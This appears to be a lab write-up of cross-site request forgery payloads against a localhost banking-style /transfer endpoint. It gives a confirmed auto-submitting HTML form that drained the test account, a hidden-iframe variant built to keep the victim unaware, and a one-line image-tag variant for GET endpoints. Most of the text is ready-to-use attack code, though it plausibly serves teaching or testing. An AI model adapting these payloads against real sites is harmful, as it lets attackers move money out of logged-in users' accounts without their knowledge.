# Payloads

All payloads below target the `/transfer` endpoint, which accepts a
`POST` request with a single parameter, `amount`, and performs no
CSRF protection (no token, no Origin/Referer check).

## Setup used for testing

- Target application: `http://localhost:8080`
- Starting balance: `$1000`
- Victim session: an active, authenticated session kept open in one
  browser tab, simulating a logged-in user.
- Attack page: a standalone local HTML file (`exploit.html`), opened
  in a separate tab of the same browser, simulating a victim visiting
  an attacker-controlled page while already logged in.

## Payload 1 — Auto-submitting POST form (confirmed working)

This is the payload that was actually used and successfully exploited
the vulnerability.

```html
<!DOCTYPE html>
<html>
<body>
<h1>CSRF PoC — auto-submitting...</h1>
<form id="csrf-form" action="http://localhost:8080/transfer" method="POST">
<input type="hidden" name="amount" value="1000">
</form>
<script>
document.getElementById('csrf-form').submit();
</script>
</body>
</html>
```

**How it works:**
- A hidden form is built pointing at the real `/transfer` endpoint on
  the target's own origin.
- The `amount` field is pre-filled with `1000`, matching the victim's
  full balance.
- The inline `<script>` submits the form automatically as soon as the
  page loads — no user interaction (no click) is required.
- Because the form's `action` points to the same domain the victim is
  logged into, the browser automatically attaches the victim's
  session cookie to the resulting request.

**Result (confirmed):**

| State | Balance |
|---|---|
| Before opening the payload | $1000 |
| After opening the payload and refreshing the app page | **$0** |

The transfer was executed as the victim, even though the victim never
interacted with the malicious page beyond loading it.

## Payload 2 — Hidden iframe auto-submit (alternative, stealthier variant)

Same effect as Payload 1, but the form submits inside an invisible
iframe instead of navigating the attacker page itself away. This is
useful for an attacker who wants the malicious page to remain visible
to the victim (e.g. disguised as something harmless) while the
transfer happens silently in the background.

```html
<!DOCTYPE html>
<html>
<body>
<h1>Nothing suspicious here 🙂</h1>

<iframe style="display:none" name="csrf-frame"></iframe>
<form id="csrf-form" action="http://localhost:8080/transfer"
      method="POST" target="csrf-frame">
  <input type="hidden" name="amount" value="1000">
</form>
<script>
document.getElementById('csrf-form').submit();
</script>
</body>
</html>
```

## Payload 3 — GET-based attack (only applicable if the endpoint also accepted GET)

If `/transfer` accepted `GET` requests with query parameters, a single
`<img>` tag would be enough to trigger the attack, without any
JavaScript at all — making it embeddable in an email, forum post, or
ad banner:

```html
<img src="http://localhost:8080/transfer?amount=1000" style="display:none">
```

*Note: this specific application only accepts `POST`, so Payload 3
was not directly exploitable here, but it is documented as it is a
very common real-world variant of this same vulnerability class.*
